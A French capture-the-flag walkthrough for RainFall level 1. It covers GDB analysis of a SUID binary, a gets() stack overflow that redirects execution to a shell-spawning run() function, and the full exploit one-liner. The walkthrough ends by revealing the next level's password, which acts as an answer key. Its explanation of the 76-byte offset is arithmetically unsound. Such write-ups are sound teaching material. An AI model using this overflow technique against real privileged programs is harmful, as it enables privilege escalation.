### Level 1

- Quand on se connecte au level1 il y a un exécutable:

```bash
level1@RainFall:~$ ./level1
[attend une entrée...]
test
[ne se passe rien, le programme se termine]
```

Le programme attend quelque chose en entrée, puis se termine sans rien faire d'apparent. C'est suspect.

```bash
level1@RainFall:~$ ls -l level1
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

- Le bit SUID est activé et le propriétaire est level2. Ça signifie que si on exploite ce programme, on obtiendra les privilèges de level2 et pourra lire son fichier .pass.

- Analyse avec GDB :

```bash
gdb ./level1
(gdb) info functions
```

On découvre 2 fonctions:
- main : celle qui s'exécute
- run : celle qui n'est jamais appelée

- analyse de main:

```bash
(gdb) disassemble main
```

- On voit ceci:
```bash
sub    $0x50,%esp        # Alloue 80 bytes sur la stack
lea    -0x50(%ebp),%eax  # Charge l'adresse du buffer
mov    %eax,(%esp)       # Passe cette adresse à gets
call   gets              # Appelle gets()
```

- Le programme alloue un buffer et appelle gets() pour lire l'entrée utilisateur

- Pour run():

```bash
(gdb) disassemble run
```

- On voit:
```bash
call   fwrite           # Affiche un str
movl   $0x8048584,(%esp) # Met "/bin/sh" en argument
call   system           # Lance un shell !
```

- la fonction run() lance un shell
- mais elle n'est jamais appelée dans le programme normal.

### La faille expliquée:

- Le problème vient de gets()
- Elle ne vérifie pas la taille de l'entrée. Si on écrit, 100, 1000 chars, elle continuera à écrire dans la mémoire

- Organisation de la stack :

```bash
[buffer local_50]  # starts ici
[...autres données locales...]
[saved EBP]
[saved EIP]       # adresse de retour
```

- Quand main() termine, le processeur lit EIP pour savoir où continuer l'exécution
- Si on écrase cette valeur avec l'adresse de run(), le programme sautera vers run() au lieu de se terminer normalement

## Trouver la taille du buffer

- On doit savoir combien de chars écrire avant d'atteindre EIP

- On analyse le code assembleur. 
- Le buffer fait 0x50 (80 bytes), mais entre le buffer et EIP il y a aussi le saved EBP (4 bytes)
- Donc : 80 - 4 = 76.

## Trouver l'adresse de run()

```bash
(gdb) print run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

- L'adresse est 0x08048444

## Phase 7: Construction de l'exploit

On doit envoyer:
- 76 bytes 
- L'adresse de run() en little-endian: \x44\x84\x04\x08
(le processeur lit EIP depuis la stack, il s'attend à trouver les octets dans l'ordre little-endian)

```bash
python -c "print('A'*76 + '\x44\x84\x04\x08')"
```

## Tests:

```bash
python -c "print('A'*76 + '\x44\x84\x04\x08')" | ./level1
```

- Output:
```
Good... Wait what?
Segmentation fault
```

- La fonction run() s'est exécutée (on voit le message), puis system("/bin/sh") a lancé un shell

- Mais le shell se ferme immédiatement.

- Le pipe ferme stdin
- Le shell n'a rien à lire, donc il se termine aussitôt.

- Pour garder stdin ouvert:

```bash
(python -c "print('A'*76 + '\x44\x84\x04\x08')"; cat) | ./level1
```

- Le cat() sans argument lit depuis stdin et le garde ouvert:

```bash
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
